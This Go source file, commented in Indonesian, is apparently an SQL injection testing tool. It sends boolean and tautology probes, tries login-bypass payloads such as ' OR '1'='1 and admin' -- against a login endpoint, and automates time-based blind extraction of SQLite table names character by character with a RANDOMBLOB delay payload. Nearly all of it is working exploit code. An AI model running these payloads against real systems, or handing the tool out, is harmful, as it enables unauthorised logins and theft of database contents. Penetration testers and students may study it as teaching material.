package inject

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func runBasicTest(baseURL string) {
	fmt.Println("\n=== BASIC SQLi TEST ===")

	normal := send(baseURL, "1")
	injected := send(baseURL, "1 OR 1=1")

	fmt.Println("Normal:\n", normal)
	fmt.Println("Injected:\n", injected)

	if injected != normal {
		fmt.Println("⚠️ SQL Injection detected!")
	}
}

func runBooleanTest(baseURL string) {
	fmt.Println("\n=== BOOLEAN-BASED TEST ===")

	trueResp := send(baseURL, "1 AND 1=1")
	falseResp := send(baseURL, "1 AND 1=2")

	fmt.Println("TRUE:\n", trueResp)
	fmt.Println("FALSE:\n", falseResp)

	if trueResp != falseResp {
		fmt.Println("⚠️ Blind SQL Injection possible")
	}
}

func runLoginTest(targetURL string) {
	fmt.Println("\n=== STARTING LOGIN BYPASS TEST ===")

	payloads := []string{
		"' OR '1'='1", // menghasilkan WHERE username = '' OR '1'='1'
		"admin' --",   // login sebagai admin, sisa query (password) diabaikan
		"' OR 1=1 --",
		"admin' AND '1'='1",
	}

	for _, payload := range payloads {
		fmt.Printf("[*] Testing payload: %s\n", payload)

		vals := url.Values{}
		vals.Add("username", payload)
		vals.Add("password", "aselolejoss") // NOTE: Password tidak berpengaruh jika berhasil bypass

		fullURL := fmt.Sprintf("%s/login?%s", targetURL, vals.Encode())

		resp, err := http.Get(fullURL)
		if err != nil {
			fmt.Printf("[!] Error connecting to server: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		content := string(body)

		if resp.StatusCode == 200 && strings.Contains(strings.ToLower(content), "success") {
			fmt.Printf("[+] BYPASS SUCCESS! Response: %s", content)
			return
		} else {
			fmt.Println("[-] Failed")
		}
	}
}

const delayThreshold = 800 * time.Millisecond

func runTimeTest(baseURL string) {
	fmt.Println("\n=== STARTING TABLE EXTRACTION (TIME-BASED) ===")
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

	for tableIdx := 0; ; tableIdx++ {
		extractedTableName := ""
		fmt.Printf("\n[*] Menarik nama tabel ke-%d...\n", tableIdx)

		for i := 1; i <= 32; i++ {
			foundChar := false

			for _, char := range charset {
				payload := fmt.Sprintf(
					"1 AND (SELECT CASE WHEN (substr((SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%%' LIMIT 1 OFFSET %d), %d, 1) = '%c') THEN (SELECT UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END)",
					tableIdx, i, char,
				)

				if checkCondition(baseURL, payload) {
					extractedTableName += string(char)
					fmt.Printf("[+] Posisi %d: %c\n", i, char)
					foundChar = true
					break
				}
			}

			if !foundChar {
				break
			}
		}

		if extractedTableName == "" {
			fmt.Println("\n[!] Semua nama tabel telah berhasil diekstrak.")
			break
		}

		fmt.Printf("[>>>] Tabel ditemukan: %s\n", extractedTableName)
	}
}

func checkCondition(baseURL string, payload string) bool {
	start := time.Now()
	send(baseURL, payload)
	duration := time.Since(start)

	// DEBUG: Hapus jika sudah lancar
	if duration > 20*time.Millisecond {
		if duration > delayThreshold {
			fmt.Printf(" [SUCCESS] Delay Detected: %v\n", duration)
			return true
		}
		fmt.Printf(" [DEBUG] Potential hit but below threshold: %v\n", duration)
	}

	return duration > delayThreshold
}
